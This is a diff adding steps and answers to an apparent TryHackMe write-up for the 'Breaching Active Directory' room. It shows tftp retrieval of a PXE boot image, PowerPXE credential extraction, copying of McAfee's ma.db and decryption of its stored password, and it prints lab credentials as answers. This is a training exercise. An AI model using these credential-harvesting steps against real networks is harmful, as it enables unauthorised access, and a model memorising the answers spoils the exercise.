@@ -186,63 +186,127 @@ This guide contains the answer and steps necessary to get to them for the [Breac
 
 1. What Microsoft tool is used to create and host PXE Boot images in organisations?
 
-
+   The answer can be found in the text.
 
    ><details><summary>Click for answer</summary></details>
 
 2. What network protocol is used for recovery of files from the MDT server?
 
-
+   The answer can be found in the text.
 
    ><details><summary>Click for answer</summary></details>
 
 3. What is the username associated with the account that was stored in the PXE Boot image?
 
+   I couldn't get the ssh connection to work on my kali instance, so I tried through the attackbox. After connecting, I created a new folder and added the powerpxe binary to it.
 
+   ```cmd
+   cd Documents
+   mkdir Kevinovitz
+   copy C:\powerpxe Kevinovitz\C:\powerpxe\LICENSE
+   cd Kevinovitz
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   MDT SSH
+
+   I then looked up the IP for the MDT server with `nslookup`:
+
+   ```cmd
+   nslookup thmmdt.za.tryhackme.com
+   ```
+
+   MDT IP
+
+   Now we can transfer the bcd file using `tftp`, using the file name we found on the MDT server.
+
+   MDT Files
+
+   ```powershell
+   tftp -i 10.200.24.202 GET "\tmp\x64uefi{D2CDF2F6-30D2-430D-84C0-32C200D1D39A}.bcd" conf.bcd
+   ```
+
+   MDT TFTP
+
+   Here we get the path to the pxe boot file. We can download it with `tftp` using this path.
+
+   ```powershell
+   tftp -i 10.200.24.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
+   ```
+
+   MDT PXE
+
+   Now we can attempt to exfiltrate the credentials.
+
+   ```powershell
+   Get-FindCredentials -WimFile pxeboot.wim
+   ```
+
+   MDT CREDENTIALS
+
+   ><details><summary>Click for answer</summary>svcMDT</details>
 
 4. What is the password associated with the account that was stored in the PXE Boot image?
 
+   This password was found in the previous task using PowerPXE.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>PXEBootSecure1@</details>
 
 5. While you should make sure to cleanup you user directory that you created at the start of the task, if you try you will notice that you get an access denied error. Don't worry, a script will help with the cleanup process but remember when you are doing assessments to always perform cleanup.
-
-
-
-   ><details><summary>Click for answer</summary></details>
 
 ### Configuration Files
 
 1. What type of files often contain stored credentials on hosts?
 
+   The answer can be found in the text.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>Configuration Files</details>
 
 2. What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator?
 
+   The answer can be found in the text.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>ma.db</details>
 
 3. What table in this database stores the credentials of the orchestrator?
 
+   The answer can be found in the text.
 
-
-   ><details><summary>Click for answer</summary></details>
+   ><details><summary>Click for answer</summary>AGENT_REPOSITORIES</details>
 
 4. What is the username of the AD account associated with the McAfee service?
 
+   First we look up where the ma.db file is located. Namely: cd C:\ProgramData\McAfee\Agent\DB.
 
+   CONFIGUIRATION FILE
 
-   ><details><summary>Click for answer</summary></details>
+   We then transfer this file to our machine.
+
+   ```cmd
+   scp thm@thmjmp1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
+   ```
+
+   CONFIGURATION transfer
+
+   Opening this database in sqlitebrowser, we can open the table containing the credentials.
+
+   ```cmd
+   sqlitebrowser ma.db
+   ```
+
+   Here we navigate to the AGENT_REPOSITORIES table and find the credentials we are looking for.
+
+   CONFIGURATION CREDENTIALS
+
+   ><details><summary>Click for answer</summary>svcAV</details>
 
 5. What is the password of the AD account associated with the McAfee service?
 
+   Using the decryption script, we can decrypt the password we got from the database.
 
+   ```cmd
+   python2 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
+   ```
 
-   ><details><summary>Click for answer</summary></details>
+   CONFIGUIRATION PASSWORD
 
+   ><details><summary>Click for answer</summary>MyStrongPassword!</details>
